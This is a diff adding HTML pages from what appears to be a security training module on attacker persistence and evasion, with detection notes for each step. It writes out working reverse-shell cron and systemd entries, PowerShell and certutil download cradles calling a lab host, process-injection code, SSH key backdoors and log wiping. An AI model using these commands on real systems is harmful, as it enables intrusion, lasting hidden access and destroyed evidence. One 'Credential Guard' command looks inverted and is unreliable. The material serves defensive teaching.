+<span style="color:#4CAF50;"># System-level persistence (requires admin)</span>
+reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v SystemUpdate /t REG_SZ /d "C:\Windows\Temp\persistence.exe" /f
+
+<span style="color:#4CAF50;"># PowerShell alternative</span>
+New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "PowerShellBackdoor" -Value "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\Users\Public\payload.ps1" -PropertyType String</code></pre>
+
+<div class="reminder" style="margin: 15px 0;">
+  <strong>🎯 Key Takeaway:</strong> Registry run keys provide simple, reliable 
+  persistence that executes every time a user logs in.
+  <strong>Detection opportunities:</strong> Monitor Event ID 4657 (registry 
+  modifications to Run/RunOnce keys); use Sysinternals Autoruns to enumerate 
+  all autorun locations; deploy EDR with registry telemetry.
+</div>
+
+<h3>Example 6.2: Scheduled Task Persistence</h3>
+
+<p><strong>Adversary Objective:</strong> Establish persistence through scheduled tasks that execute at defined intervals or system events.</p>
+
+<p>Scheduled tasks can be configured to run on user login, at system startup, or on a recurring schedule. This allows an adversary to re-establish access even if their initial entry point is removed.</p>
+
+<pre><code><span style="color:#4CAF50;"># Create a task that runs every 5 minutes</span>
+schtasks /create /tn "WindowsUpdateService" /tr "C:\Users\Public\backdoor.exe" /sc minute /mo 5 /f
+
+<span style="color:#4CAF50;"># Create a task that runs at system startup (SYSTEM context)</span>
+schtasks /create /tn "SystemStartupBackdoor" /tr "C:\Windows\Temp\persistence.exe" /sc onstart /ru SYSTEM /f
+
+<span style="color:#4CAF50;"># PowerShell alternative</span>
+$action = New-ScheduledTaskAction -Execute "C:\Users\Public\backdoor.exe"
+$trigger = New-ScheduledTaskTrigger -AtLogOn -User "DOMAIN\user"
+Register-ScheduledTask -TaskName "UpdateService" -Action $action -Trigger $trigger</code></pre>
+
+<div class="reminder" style="margin: 15px 0;">
+  <strong>🎯 Key Takeaway:</strong> Scheduled tasks provide resilient persistence 
+  with fine-grained scheduling controls and SYSTEM-level execution.
+  <strong>Detection opportunities:</strong> Monitor Event IDs 4698 (task creation) 
+  and 4702 (task update); audit scheduled tasks with <code>schtasks /query</code>; 
+  deploy EDR with process lineage visibility.
+</div>
+
+<h3>Example 6.3: Service Installation Persistence</h3>
+
+<p><strong>Adversary Objective:</strong> Install a malicious service that automatically starts with the operating system.</p>
+
+<p>Services run with SYSTEM privileges and persist across reboots. An adversary can create a new service or modify an existing one to execute arbitrary commands.</p>
+
+<pre><code><span style="color:#4CAF50;"># Create a new service that auto-starts</span>
+sc create "WindowsUpdateSvc" binPath= "C:\Windows\Temp\payload.exe" start= auto
+
+<span style="color:#4CAF50;"># Create a service that executes a PowerShell payload</span>
+sc create "PowerShellUpdateSvc" binPath= "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\Windows\Temp\payload.ps1" start= auto
+
+<span style="color:#4CAF50;"># Remote service creation (lateral movement)</span>
+netexec smb 10.0.0.25 -u administrator -p 'Password123!' -M sc_exe -o SERVICE_NAME=UpdateService SERVICE_PATH="C:\Windows\Temp\payload.exe"</code></pre>
+
+<div class="reminder" style="margin: 15px 0;">
+  <strong>🎯 Key Takeaway:</strong> Service installation provides SYSTEM-level 
+  persistence that survives reboots and is less visible than user-level mechanisms.
+  <strong>Detection opportunities:</strong> Monitor Event ID 7045 (new service 
+  installed); audit services with <code>sc query</code>; deploy EDR with 
+  service creation telemetry; use application whitelisting.
+</div>
+
+<h3>Example 6.4: Linux Cron &amp; Systemd Persistence</h3>
+
+<p><strong>Adversary Objective:</strong> Establish persistence on Linux systems using cron jobs and systemd timers.</p>
+
+<p>Cron jobs allow scheduled execution of commands at specified intervals. Systemd timers provide similar functionality with more granular control and logging capabilities.</p>
+
+<pre><code><span style="color:#4CAF50;"># User-level cron: run every minute</span>
+(crontab -l 2>/dev/null; echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/10.0.0.20/4444 0>&1'") | crontab -
+
+<span style="color:#4CAF50;"># System-level cron (requires root)</span>
+echo "* * * * * root /bin/bash -c 'bash -i >& /dev/tcp/10.0.0.20/4444 0>&1'" >> /etc/crontab
+
+<span style="color:#4CAF50;"># @reboot cron: run at system startup</span>
+(crontab -l 2>/dev/null; echo "@reboot /bin/bash -c 'bash -i >& /dev/tcp/10.0.0.20/4444 0>&1'") | crontab -
+
+<span style="color:#4CAF50;"># Systemd service with auto-restart</span>
+cat > /etc/systemd/system/backdoor.service &lt;&lt; EOF
+[Unit]
+Description=Backdoor Service
+After=network.target
+
+[Service]
+Type=simple
+ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.20/4444 0>&1'
+Restart=always
+RestartSec=60
+
+[Install]
+WantedBy=multi-user.target
+EOF
+
+systemctl enable backdoor.service
+systemctl start backdoor.service</code></pre>
+
+<div class="reminder" style="margin: 15px 0;">
+  <strong>🎯 Key Takeaway:</strong> Cron jobs and systemd timers are the backbone 
+  of Linux persistence. Systemd services offer more robust restart capabilities.
+  <strong>Detection opportunities:</strong> Monitor /etc/crontab and user crontabs; 
+  audit systemd service files; use file integrity monitoring (FIM); deploy EDR 
+  with process lineage and scheduled task telemetry.
+</div>
+
+<h3>Example 6.5: SSH Key Persistence</h3>
+
+<p><strong>Adversary Objective:</strong> Establish persistent, passwordless access via SSH public key authentication.</p>
+
+<p>By appending a public key to <code>~/.ssh/authorized_keys</code>, an adversary ensures they can re-enter the system even if passwords are changed or the initial entry point is patched.</p>
+
+<pre><code><span style="color:#4CAF50;"># Generate a key pair on the attacker machine</span>
+ssh-keygen -t rsa -b 4096 -f ~/.ssh/persistent_key -N ""
+
+<span style="color:#4CAF50;"># Copy the public key to the target's authorized_keys</span>
+ssh-copy-id -i ~/.ssh/persistent_key.pub user@10.0.0.10
+
+<span style="color:#4CAF50;"># Manual addition (without ssh-copy-id)</span>
+echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC..." >> ~/.ssh/authorized_keys
+chmod 600 ~/.ssh/authorized_keys
+
+<span style="color:#4CAF50;"># Test persistent access</span>
+ssh -i ~/.ssh/persistent_key user@10.0.0.10</code></pre>
+
+<div class="reminder" style="margin: 15px 0;">
+  <strong>🎯 Key Takeaway:</strong> SSH keys provide passwordless, persistent 
+  access that survives password changes. Root-level SSH keys are especially dangerous.
+  <strong>Detection opportunities:</strong> Monitor ~/.ssh/authorized_keys for 
+  modifications; audit SSH key usage; implement certificate-based SSH; use file 
+  integrity monitoring (FIM).
+</div>
+
+<h3>Example 6.6: Process Injection</h3>
+
+<p><strong>Adversary Objective:</strong> Execute malicious code within a legitimate process to evade detection and bypass application whitelisting.</p>
+
+<p>By injecting code into a trusted process such as <code>explorer.exe</code> or <code>svchost.exe</code>, the adversary's payload runs under a legitimate process name, making it harder for security tools to detect.</p>
+
+<pre><code><span style="color:#4CAF50;"># Using Mimikatz to inject into a running process</span>
+mimikatz # privilege::debug
+mimikatz # process::list
+mimikatz # process::start /pid:1234 /cmd:"cmd.exe /c echo Injected!"
+
+<span style="color:#4CAF50;"># PowerShell-based process injection</span>
+$code = @"
+using System;
+using System.Runtime.InteropServices;
+public class Injector {
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);
+    [DllImport("kernel32.dll")]
+    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, out IntPtr lpNumberOfBytesWritten);
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, int dwSize, int flAllocationType, int flProtect);
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, int dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, int dwCreationFlags, IntPtr lpThreadId);
+}
+"@
+Add-Type -TypeDefinition $code
+
+$pid = (Get-Process -Name notepad).Id
+$handle = [Injector]::OpenProcess(0x1F0FFF, $false, $pid)
+$bytes = [System.Text.Encoding]::ASCII.GetBytes("cmd.exe /c whoami")
+$addr = [Injector]::VirtualAllocEx($handle, [IntPtr]::Zero, $bytes.Length, 0x1000, 0x40)
+[Injector]::WriteProcessMemory($handle, $addr, $bytes, $bytes.Length, [ref][IntPtr]::Zero)
+[Injector]::CreateRemoteThread($handle, [IntPtr]::Zero, 0, $addr, [IntPtr]::Zero, 0, [IntPtr]::Zero)</code></pre>
+
+<div class="reminder" style="margin: 15px 0;">
+  <strong>🎯 Key Takeaway:</strong> Process injection allows adversaries to run 
+  code inside trusted processes, evading detection and application whitelisting.
+  <strong>Detection opportunities:</strong> Monitor for process injection patterns 
+  (Event ID 4663); use EDR with behavioral detection; implement code integrity 
+  checks; use Process Explorer to inspect loaded DLLs.
+</div>
+
+<h3>Example 6.7: DLL Side-Loading &amp; Hijacking</h3>
+
+<p><strong>Adversary Objective:</strong> Execute malicious code by placing a malicious DLL in a location where a legitimate application will load it.</p>
+
+<p>Windows searches for DLLs in a specific order. By placing a malicious DLL in the application directory with a name that matches a missing DLL, the adversary can execute their code within the context of the legitimate application.</p>
+
+<pre><code><span style="color:#4CAF50;"># Use Process Monitor to identify missing DLLs</span>
+# Filter: Process Name = vulnerable_app.exe, Result = NAME NOT FOUND
+vulnerable_app.exe    CreateFile    C:\Program Files\App\missing.dll    NAME NOT FOUND
+
+<span style="color:#4CAF50;"># Generate a malicious DLL</span>
+msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.20 LPORT=4444 -f dll -o malicious.dll
+
+<span style="color:#4CAF50;"># Place it in the application directory with the missing name</span>
+copy malicious.dll "C:\Program Files\App\missing.dll"
+
+<span style="color:#4CAF50;"># Alternative: DLL Search Order Hijacking</span>
+# Place the DLL in a directory that is searched before the legitimate location
+# Example: Place version.dll in C:\Windows\System32\ to intercept system calls</code></pre>
+
+<div class="reminder" style="margin: 15px 0;">
+  <strong>🎯 Key Takeaway:</strong> DLL side-loading uses legitimate binaries to 
+  load malicious code, bypassing many security controls.
+  <strong>Detection opportunities:</strong> Monitor for DLL loading from unusual 
+  paths; use application whitelisting; enable DLL signing verification; deploy 
+  EDR with DLL load telemetry.
+</div>
+
+<h3>Example 6.8: Living Off the Land (LOLBins)</h3>
+
+<p><strong>Adversary Objective:</strong> Execute commands and perform operations using built-in system tools to avoid dropping malicious files.</p>
+
+<p>By using legitimate Windows tools such as PowerShell, WMI, certutil, and bitsadmin, adversaries can download, execute, and maintain access without writing a single malicious executable to disk.</p>
+
+<pre><code><span style="color:#4CAF50;"># PowerShell download cradle (in-memory execution)</span>
+powershell -WindowStyle Hidden -ExecutionPolicy Bypass -c "IEX(New-Object Net.WebClient).downloadString('http://10.0.0.20/payload.ps1')"
+
+<span style="color:#4CAF50;"># WMI process creation</span>
+wmic process call create "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -c 'IEX(New-Object Net.WebClient).downloadString(\"http://10.0.0.20/payload.ps1\")'"
+
+<span style="color:#4CAF50;"># certutil file download</span>
+certutil -urlcache -split -f http://10.0.0.20/payload.exe C:\Windows\Temp\payload.exe
+
+<span style="color:#4CAF50;"># BITSAdmin file transfer</span>
+bitsadmin /transfer myJob /download /priority normal http://10.0.0.20/payload.exe C:\Windows\Temp\payload.exe
+
+<span style="color:#4CAF50;"># regsvr32 script execution (squiblydoo)</span>
+regsvr32 /s /n /u /i:http://10.0.0.20/payload.sct scrobj.dll</code></pre>
+
+<div class="reminder" style="margin: 15px 0;">
+  <strong>🎯 Key Takeaway:</strong> LOLBins are the stealthiest way to execute 
+  malicious activity because they use trusted, signed Microsoft binaries.
+  <strong>Detection opportunities:</strong> Enable PowerShell ScriptBlock and 
+  Module logging; monitor WMI activity; audit certutil, bitsadmin, and regsvr32 
+  usage; deploy EDR with behavioral detection.
+</div>
+
+<h3>Example 6.9: Rootkits &amp; Kernel-Level Persistence</h3>
+
+<p><strong>Adversary Objective:</strong> Hide processes, files, and network connections using kernel-level manipulation to remain undetected.</p>
+
+<p>Rootkits operate at the kernel level, intercepting system calls to hide malicious activity from user-mode tools like Task Manager, file explorers, and even some security software.</p>
+
+<pre><code><span style="color:#4CAF50;"># Hide a process using Mimikatz (user-mode hiding)</span>
+mimikatz # privilege::debug
+mimikatz # process::hide /pid:1234
+
+<span style="color:#4CAF50;"># Hide files using Alternate Data Streams (ADS)</span>
+type backdoor.exe > C:\Windows\System32\svchost.exe:backdoor.exe
+start C:\Windows\System32\svchost.exe:backdoor.exe
+
+<span style="color:#4CAF50;"># Hide files using attributes</span>
+attrib +h +s C:\Windows\Temp\backdoor.exe
+
+<span style="color:#4CAF50;"># Kernel-level driver loading (requires driver signing bypass)</span>
+sc create MaliciousDriver binPath= C:\Windows\Temp\driver.sys type= kernel start= auto
+sc start MaliciousDriver</code></pre>
+
+<div class="reminder" style="margin: 15px 0;">
+  <strong>🎯 Key Takeaway:</strong> Rootkits provide the deepest level of stealth, 
+  hiding malicious activity from both user-mode tools and many detection sensors.
+  <strong>Detection opportunities:</strong> Use anti-rootkit tools (GMER, RootkitRevealer); 
+  enable Driver Verifier; implement secure boot and memory integrity (Hyper-V); 
+  deploy EDR with kernel-level telemetry.
+</div>
+
+<h3>Blue Team: Defensive Countermeasures</h3>
+
+<p><strong>Objective:</strong> Detect, disrupt, and recover from persistence and evasion techniques.</p>
+
+<p><strong>Detection Rules &amp; Monitoring</strong></p>
+
+<pre><code><span style="color:#4CAF50;"># Detect registry run key modifications (Event ID 4657)</span>
+Get-WinEvent -LogName Security -FilterXPath "*[System[EventID=4657]]" |
+    Where-Object { $_.Properties[2].Value -match "Run|RunOnce" } |
+    Select-Object TimeCreated, @{N='ObjectName';E={$_.Properties[3].Value}}, @{N='Value';E={$_.Properties[5].Value}}
+
+<span style="color:#4CAF50;"># Detect scheduled task creation (Event ID 4698)</span>
+Get-WinEvent -LogName Security -FilterXPath "*[System[EventID=4698]]" |
+    Select-Object TimeCreated, @{N='TaskName';E={$_.Properties[0].Value}}, @{N='Command';E={$_.Properties[2].Value}}
+
+<span style="color:#4CAF50;"># Detect service creation (Event ID 7045)</span>
+Get-WinEvent -LogName System -FilterXPath "*[System[EventID=7045]]" |
+    Select-Object TimeCreated, @{N='ServiceName';E={$_.Properties[0].Value}}, @{N='ImagePath';E={$_.Properties[1].Value}}
+
+<span style="color:#4CAF50;"># Detect suspicious PowerShell activity (Event ID 4103)</span>
+Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" -FilterXPath "*[System[EventID=4103]]" |
+    Where-Object { $_.Properties[1].Value -match "IEX|Invoke-Expression|downloadString|Net.WebClient" } |
+    Select-Object TimeCreated, @{N='Command';E={$_.Properties[4].Value}}</code></pre>
+
+<p><strong>Incident Response: Persistence &amp; Evasion</strong></p>
+
+<div class="iscsec-table-responsive">
+  <table class="iscsec-table" aria-label="Persistence and evasion incident response">
+    <thead>
+      <tr>
+        <th>Step</th>
+        <th>Action</th>
+        <th>Tool / Command</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td><strong>1. Detect</strong></td>
+        <td>Identify persistence mechanisms and evasion techniques</td>
+        <td><code>SIEM alerts</code>, <code>Autoruns</code>, <code>Sysmon</code></td>
+      </tr>
+      <tr>
+        <td><strong>2. Contain</strong></td>
+        <td>Disable persistence mechanisms and isolate affected hosts</td>
+        <td><code>schtasks /delete</code>, <code>reg delete</code>, <code>sc delete</code></td>
+      </tr>
+      <tr>
+        <td><strong>3. Investigate</strong></td>
+        <td>Identify the attacker's foothold and remove all backdoors</td>
+        <td><code>Event Log analysis</code>, <code>forensic imaging</code></td>
+      </tr>
+      <tr>
+        <td><strong>4. Eradicate</strong></td>
+        <td>Remove all persistence mechanisms and close entry points</td>
+        <td><code>AV scan</code>, <code>reimage</code>, <code>patch vulnerabilities</code></td>
+      </tr>
+      <tr>
+        <td><strong>5. Recover</strong></td>
+        <td>Restore normal operations and validate controls</td>
+        <td><code>validate system integrity</code>, <code>rebuild trust</code></td>
+      </tr>
+      <tr>
+        <td><strong>6. Learn</strong></td>
+        <td>Update persistence detection and response</td>
+        <td><code>enhance monitoring</code>, <code>implement JIT</code>, <code>educate teams</code></td>
+      </tr>
+    </tbody>
+  </table>
+</div>
+
+<p><strong>Additional Defensive Measures</strong></p>
+
+<pre><code><span style="color:#4CAF50;"># Enable PowerShell logging</span>
+# Group Policy: Computer Config -> Policies -> Admin Templates -> Windows Components -> Windows PowerShell
+# Turn on PowerShell Script Block Logging -> Enabled
+# Turn on PowerShell Module Logging -> Enabled
+
+<span style="color:#4CAF50;"># Enable Sysmon for advanced logging</span>
+sysmon64.exe -accepteula -i sysmon_config.xml
+
+<span style="color:#4CAF50;"># Implement AppLocker to prevent unauthorized executables</span>
+# Group Policy: Computer Config -> Windows Settings -> Security Settings -> Application Control Policies -> AppLocker
+
+<span style="color:#4CAF50;"># Enable Credential Guard to prevent LSASS dumping</span>
+bcdedit /set {0cb3b571-2f2e-4343-a879-d86a476d7215} loadoptions DISABLE-LSA-ISO
+bcdedit /set vsmlaunchtype Auto</code></pre>
+
+<div class="reminder" style="margin-top: 15px;">
+  <strong>⚠️ Threat Intelligence Disclaimer:</strong> These adversarial examples 
+  are derived from real-world attacker tradecraft and are provided for authorized 
+  security testing, detection engineering, and defensive preparedness only.
+</div>
+
+<div class="adversary-philosophy" style="background: rgba(244,67,54,0.05); border-left: 4px solid #f44336; padding: 18px 24px; margin: 24px 0; border-radius: 4px;">
+  <p style="margin: 0; font-style: italic; color: #cfd8dc;">
+    "Access is temporary. Persistence is permanent. Attackers know that the first breach is often the easiest — the real challenge is staying inside when defenders start looking. Every registry key, scheduled task, and hidden process is a thread they weave into the fabric of your system. Defenders must think like weavers too — constantly checking for threads that don’t belong, knowing that a single loose thread can unravel the entire tapestry."
+  </p>
+</div>
+
+<!-- =========================================== -->
+<!-- PERSISTENCE                                  -->
+<!-- =========================================== -->
+
+      <h3>Persistence &amp; Evasion — Technical Examples</h3>
+
+      <h3>Concept 1: Persistence Mechanisms</h3>
+      <p><strong>Security Concept:</strong> Continuity of Access.</p>
+      <p>If a system reboots or the initial exploit session closes, persistence mechanisms allow an adversary to regain control. Security professionals must identify backdoors that survive system restarts.</p>
+
+      <h3>Tool: Crontab (Linux Task Scheduler)</h3>
+      <pre><code><span style="color:#4CAF50;"># Add a reverse shell to root's crontab (syntax validated via crontab)</span>
+(crontab -l 2&gt;/dev/null; echo "* * * * * /bin/bash -c 'bash -i &gt;&amp; /dev/tcp/&lt;attacker-ip&gt;/&lt;port&gt; 0&gt;&amp;1'") | crontab -
+
+<span style="color:#4CAF50;"># Alternative: direct file path (RHEL/CentOS style)</span>
+echo "* * * * * /bin/bash -c 'bash -i &gt;&amp; /dev/tcp/&lt;attacker-ip&gt;/&lt;port&gt; 0&gt;&amp;1'" &gt;&gt; /var/spool/cron/root
+
+<span style="color:#4CAF50;"># Verify the entry was added</span>
+crontab -l</code></pre>
+
+      <h3>Tool: SSH Keys (Linux)</h3>
+      <pre><code><span style="color:#4CAF50;"># Generate key on attacker machine</span>
+ssh-keygen -t rsa -b 2048 -f ~/.ssh/backdoor
+
+<span style="color:#4CAF50;"># Append public key to target</span>
+cat ~/.ssh/backdoor.pub &gt;&gt; /home/user/.ssh/authorized_keys
+
+<span style="color:#4CAF50;"># Attacker can now login without a password</span>
+ssh -i ~/.ssh/backdoor user@192.168.1.10
+Welcome to Ubuntu 20.04 LTS...</code></pre>
+
+      <h3>Tool: Windows Registry (Persistence)</h3>
+      <pre><code>New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "UpdateSvc" -Value "C:\Users\Public\malware.exe" -PropertyType String</code></pre>
+
+      <h3>Concept 2: Evasion Techniques</h3>
+      <p><strong>Security Concept:</strong> Stealth &amp; Anti-Forensics.</p>
+      <p>Adversaries attempt to avoid detection by antivirus, Endpoint Detection and Response, and log analysis systems. This involves hiding both the access method and the presence of tools.</p>
+
+      <h3>Tool: Process Injection (Windows)</h3>
+      <pre><code><span style="color:#4CAF50;"># Adversarial Action: Execute commands within a trusted process context</span>
+mimikatz # privilege::debug
+mimikatz # process::start /pid:1234 /cmd:"cmd.exe /c whoami &gt;&gt; C:\Temp\output.txt"
+
+<span style="color:#4CAF50;"># Alternatively: reflectively inject a payload DLL into explorer.exe</span>
+<span style="color:#4CAF50;"># The malicious logic runs inside the address space of the signed binary</span></code></pre>
+
+      <p>
+        <strong>Security Insight:</strong> If <code>mimikatz.exe</code> is running as a standalone process, it is easy to spot. When commands are executed via <code>process::start</code> inside <code>explorer.exe</code> or via reflective DLL injection, the activity blends in with normal system processes and evades application-whitelisting controls.
+      </p>
+
+      <h3>Tool: Log Clearing (Linux/Windows)</h3>
+      <pre><code><span style="color:#4CAF50;"># Clear bash history</span>
+history -c
+&gt; ~/.bash_history
+
+<span style="color:#4CAF50;"># Clear auth logs</span>
+&gt; /var/log/auth.log
+
+<span style="color:#4CAF50;"># Checking logs after clearing</span>
+cat /var/log/auth.log
+(Empty or truncated file)</code></pre>
+
+      <h3>Tool: Encryption/Tunneling (Evasion)</h3>
+      <pre><code><span style="color:#4CAF50;"># Simple SSH tunnel for HTTP traffic</span>
+ssh -L 8080:localhost:80 user@192.168.1.10
+
+<span style="color:#4CAF50;"># Traffic on port 8080 is now tunneled through SSH.</span>
+<span style="color:#4CAF50;"># Firewall sees only SSH traffic on port 22, not HTTP.</span></code></pre>
+
+      <h3>Summary Table: Persistence &amp; Evasion</h3>
+
+      <div class="iscsec-table-responsive">
+        <table class="iscsec-table" aria-label="Persistence and evasion summary">
+          <thead>
+            <tr>
+              <th>Concept</th>
+              <th>Mechanism</th>
+              <th>Tool/Command</th>
+              <th>Expected Output / Evidence</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td>Persistence</td>
+              <td>Scheduled Task</td>
+              <td><code>crontab -e</code></td>
+              <td>Entry appears in <code>/var/spool/cron/...</code></td>
+            </tr>
+            <tr>
+              <td>Persistence</td>
+              <td>SSH Keys</td>
+              <td><code>cat key.pub &gt;&gt; authorized_keys</code></td>
+              <td>Password-less login possible</td>
+            </tr>
+            <tr>
+              <td>Persistence</td>
+              <td>Registry Run Key</td>
+              <td><code>New-ItemProperty ... Run</code></td>
+              <td>Malware starts on user login</td>
+            </tr>
+            <tr>
+              <td>Evasion</td>
+              <td>Process Injection</td>
+              <td><code>mimikatz process::start /pid:&lt;pid&gt; ...</code></td>
+              <td>Malicious code executes inside a trusted process address space</td>
+            </tr>
+            <tr>
+              <td>Evasion</td>
+              <td>Log Clearing</td>
+              <td><code>&gt; /var/log/auth.log</code></td>
+              <td>Auth log file is empty or truncated</td>
+            </tr>
+            <tr>
+              <td>Evasion</td>
+              <td>Tunneling</td>
+              <td><code>ssh -L ...</code></td>
+              <td>Traffic is encrypted; firewall sees SSH, not HTTP</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+
+            <h3>Integration with Security Concepts</h3>
+      <ul>
+        <li><strong>Availability:</strong> Persistence mechanisms, such as cron jobs, ensure the adversary can return, potentially leading to denial of service if they crash the system repeatedly.</li>
+        <li><strong>Confidentiality:</strong> Evasion via encryption prevents the exposure of sensitive data during transit.</li>
+        <li><strong>Integrity:</strong> Log clearing compromises the integrity of audit trails, making forensic analysis difficult.</li>
+        <li><strong>Authentication:</strong> SSH key persistence bypasses password authentication entirely.</li>
+        <li><strong>Authenticity:</strong> SSH key persistence allows an adversary to masquerade as a legitimate user, undermining identity validation and trusted access.</li>
+        <li><strong>Non-repudiation:</strong> Log clearing and shell-history removal destroy evidence of adversary actions, preventing accountability and forensic attribution.</li>
+      </ul>
+
+      <h3>How This Connects to Your Training Path</h3>
+      <ol>
+        <li><strong>Start with Availability and Confidentiality:</strong> Students first learn how adversaries disrupt services and steal information. These concepts form the foundation for understanding attack impact and risk.</li>
+        <li><strong>Move into Integrity:</strong> Data manipulation, log tampering, supply-chain attacks, and web application exploitation demonstrate how attackers alter trusted information to achieve their objectives.</li>
+        <li><strong>Progress into Authentication and Authorization:</strong> Credential attacks, session hijacking, privilege escalation, and lateral movement introduce the techniques adversaries use to expand access inside a target environment.</li>
+        <li><strong>Understand Non-repudiation:</strong> Logging, timestamping, and audit trails create accountability. Attackers target these controls to erase evidence and deny investigators the ability to attribute actions to a specific actor.</li>
+        <li><strong>Finish with Persistence and Evasion:</strong> Students now move beyond gaining access and learn how adversaries maintain long-term control through scheduled tasks, SSH keys, registry modifications, process injection, encrypted tunnels, and anti-forensic techniques.</li>
+      </ol>
+
+      <div class="reminder" style="margin-top: 15px;">
+        <em><strong>Inside the Adversary Mindset:</strong></em> Access is only the beginning. Successful adversaries think in stages: disrupt, manipulate, steal, impersonate, expand, and remain. Every security control you encounter throughout this course can be viewed through that lens, either as a barrier to those objectives or a mechanism used to detect them.
+      </div>
+    </section>
+
+<!-- ============================================================ -->
+<!-- ⚫ ADVERSARIAL LEVEL                                          -->
+<!-- ============================================================ -->
+
+    <section class="module-section" id="adversarial-level">
+      <h2>5. Adversarial Level</h2>
+      <p>
+        Threat actor perspective. Advanced persistent threats, criminal groups, and hacktivists align their operations with strategic objectives, not just technical exploits. This level focuses on how adversaries weaponize information security concepts.
+      </p>
+
+      <h3>Threat Actor Behavior</h3>
+
+      <h3>Strategic Objectives</h3>
+      <ul>
+        <li>Nation-state actors use InfoWar categories (C2 warfare, intelligence-based warfare, psychological warfare) to achieve geopolitical objectives.</li>
+        <li>Criminal syndicates focus on economic warfare, disrupting financial systems, extorting organizations, and monetizing stolen data.</li>
+        <li>Hacktivists leverage psychological warfare defacement, data leaks, and disinformation campaigns to shape public perception.</li>
+      </ul>
+
+      <h3>Operational Phases</h3>
+      <ul>
+        <li>Treat persistence and evasion not as post-exploitation footnotes, but as strategic imperatives that bridge initial access to long-term operational impact.</li>
+        <li>Map every CIAAN principle to a MITRE ATT&amp;CK phase.</li>
+        <li>Predict attacker paths from intelligence rather than from alerts.</li>
+        <li>Ensure offensive findings produce measurable defensive hardening.</li>
+      </ul>
+
+      <div class="adversary-philosophy" style="background: rgba(244,67,54,0.05); border-left: 4px solid #f44336; padding: 18px 24px; margin: 24px 0; border-radius: 4px;">
+        <p style="margin: 0; font-style: italic; color: #cfd8dc;">
+          <strong>Note:</strong> "If you only remember one thing from this lesson, remember this: defenders build controls. Attackers build paths around controls. 
+		  Your job is to see the path before the attacker builds it."
+        </p>
+      </div>
+    </section>
+
+<!-- ============================================================ -->
+<!-- BLUEPRINT PREVIEW                                             -->
+<!-- ============================================================ -->
+
+    <section class="module-section" id="blueprint-preview">
+      <h2>6. Blueprint Preview: Inside the Adversary Mindset</h2>
+      <p>
+        The <a href="08-practical-walkthrough">Practical Walkthrough</a> presents a fully verified proof-of-concept against 
+        the ISCSEC enterprise environment. It is designed as an <strong>observational blueprint</strong>, a step-by-step 
+        demonstration of how a professional operator thinks, decides, and acts during each phase of an engagement.
+      </p>
+
+      <p>
+        Hands-on replication in your own authorized lab environment is <strong>strongly recommended</strong> to develop 
+        operational proficiency. Study the hypotheses formed before enumeration, the reasoning behind each tool selection, 
+        the interpretation of outputs, and the tactical decisions at each stage. This mirrors real-world adversary tradecraft 
+        and builds a reusable methodology for your authorized assessments. Any practice outside the official ISCSEC 
+        environment is undertaken <strong>at your own risk</strong> and subject to the liability terms below.
+      </p>
+
+      <div class="reminder" style="margin-top: 15px;">
+        <strong>⚠️ Liability Disclaimer:</strong> 
+        The content, commands, tools, and techniques in this module are provided for 
+        <strong>educational and training purposes only</strong>. If you choose to replicate or adapt any of the demonstrated 
+        techniques in your own environment, you do so <strong>at your own risk</strong>. ISCSEC accepts 
+        <strong>no liability</strong> for any damage, data loss, system compromise, legal consequences, or other outcomes 
+        resulting from the application of these techniques outside the official ISCSEC training environment. 
+        <strong>Always obtain proper written authorization before testing any system</strong> and ensure you have a signed 
+        Rules of Engagement (RoE) and appropriate legal counsel before performing any security assessment.
+      </div>
+
+      <h3>What You Will Observe</h3>
+      <ul>
+        <li><strong>Phase 1 — Intelligence Gathering:</strong> How passive OSINT transforms a single domain name into a complete target profile.</li>
+        <li><strong>Phase 2 — Network Mapping:</strong> How DNS misconfigurations and dual-homed hosts reveal attack paths without active scanning.</li>
+        <li><strong>Phase 3 — Compromise:</strong> How credential extraction, DCSync, and Golden Ticket creation establish persistent domain control.</li>
+        <li><strong>Phase 4 — Operational Review:</strong> How every action is documented, timed, and mapped to MITRE ATT&amp;CK for reporting.</li>
+      </ul>
+
+      <div class="reminder" style="margin-top: 15px;">
+        <strong>Operator Continuity:</strong> All commands have been executed in the ISCSEC lab environment under a signed 
+        Rules of Engagement. Your role is to observe the adversary decision cycle and apply this methodology to your own 
+        authorized engagements.
+      </div>
+    </section>
+
+<!-- ============================================================ -->
+<!-- KEY TAKEAWAYS                                                 -->
+<!-- ============================================================ -->
+
+    <section class="module-section" id="key-takeaways">
+      <h2>7. Key Takeaways</h2>
+
+      <div class="iscsec-table-responsive">
+        <table class="iscsec-table" aria-label="Key takeaways">
+          <thead>
+            <tr>
+              <th>Concept</th>
+              <th>What You Should Remember</th>
+              <th>Operator View</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td><strong>CIAAN</strong></td>
+              <td>Confidentiality, Integrity, Availability, Authenticity, and Non-repudiation define what security must protect.</td>
+              <td>Each element becomes an attacker objective.</td>
+            </tr>
+            <tr>
+              <td><strong>TTPs</strong></td>
+              <td>Tactics explain why, techniques explain how, and procedures explain the step-by-step.</td>
+              <td>Track behavior, not just tools.</td>
+            </tr>
+            <tr>
+              <td><strong>Vulnerabilities</strong></td>
